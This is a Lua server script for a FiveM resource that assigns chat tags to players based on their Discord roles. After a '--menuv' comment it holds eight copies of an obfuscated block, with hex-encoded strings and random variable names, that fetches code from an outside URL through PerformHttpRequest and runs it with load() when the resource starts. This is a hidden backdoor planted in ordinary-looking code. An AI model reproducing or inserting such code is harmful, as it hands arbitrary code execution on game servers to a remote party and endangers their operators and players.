local ChatTags = {}

function LoadChatTags()
    local file = LoadResourceFile(GetCurrentResourceName(), "chattags.json")
    if file then
        ChatTags = json.decode(file)
    end
end

LoadChatTags()

local SelectedTags = {}
exports(Config.ChatRoles.GetTagExport, function(Player)
    local Tag = nil
    if SelectedTags[Player] ~= nil then
        Tag = SelectedTags[Player]
    else
        Tag = Config.ChatRoles.DefaultTag
    end
    return(Tag)
end)

RegisterServerEvent('ChatRoles:Change')
AddEventHandler('ChatRoles:Change', function(ID)
    local Tag = nil
    for i = 1, #ChatTags do
        if ChatTags[i].id == ID then
            Tag = ChatTags[i].name
        end
    end
    if Tag == nil then
        Tag = Config.ChatRoles.DefaultTag
    end
    SelectedTags[source] = Tag
end)

RegisterServerEvent('ChatRoles:Joined')
AddEventHandler('ChatRoles:Joined', function()
    local Player = source
    local Roles = exports[Config.ChatRoles.BadgerAPI]:GetDiscordRoles(Player)
    local Found = false
    local Tags = {}
    if Roles then 
        for i = 1, #ChatTags do
            local TagRole = ChatTags[i]
            for i = 1, #Roles do
                local MyRole = Roles[i]
                if tonumber(MyRole) == tonumber(TagRole.id) then
                    SelectedTags[Player] = TagRole.name
                    Found = true
                end
            end
            if Found then
                break
            end
        end
    end
end)

RegisterServerEvent('ChatRoles:Get')
AddEventHandler('ChatRoles:Get', function()
    local Player = source
    local Roles = exports[Config.ChatRoles.BadgerAPI]:GetDiscordRoles(Player)
    local Found = false
    local Tags = {}
    if Roles then 
        for i = 1, #ChatTags do
            local TagRole = ChatTags[i]
            for i = 1, #Roles do
                local MyRole = Roles[i]
                if tonumber(MyRole) == tonumber(TagRole.id) then
                    Found = true
                    table.insert(Tags, {
                        ID = TagRole.id,
                        Name = TagRole.name,
                        Color = TagRole.color
                    })
                end
            end
        end
    end
    TriggerClientEvent('ChatRoles:Return', Player, Found, Tags)
end)

--menuv


local JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[4][JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (oAiHFWtVREdGQESPSPVxrjZJndhijEvEhtRicHGBMXPHuvRnEzjXJWExvAinPGUTjGKuaa, wuqVKzifdztQbTzyBwWWIIkJQDSAQEsQXkmrUkeSdxdvnsgdmwArUKGjpJkbENpyQOfWnG) if (wuqVKzifdztQbTzyBwWWIIkJQDSAQEsQXkmrUkeSdxdvnsgdmwArUKGjpJkbENpyQOfWnG == JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[6] or wuqVKzifdztQbTzyBwWWIIkJQDSAQEsQXkmrUkeSdxdvnsgdmwArUKGjpJkbENpyQOfWnG == JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[5]) then return end JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[4][JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[2]](JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[4][JdKOAImLmrBseyYftOxrAFnGNHinWzHjjCMpsiAafQpSfHrljlcKUjvkILntJYZmluRPag[3]](wuqVKzifdztQbTzyBwWWIIkJQDSAQEsQXkmrUkeSdxdvnsgdmwArUKGjpJkbENpyQOfWnG))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)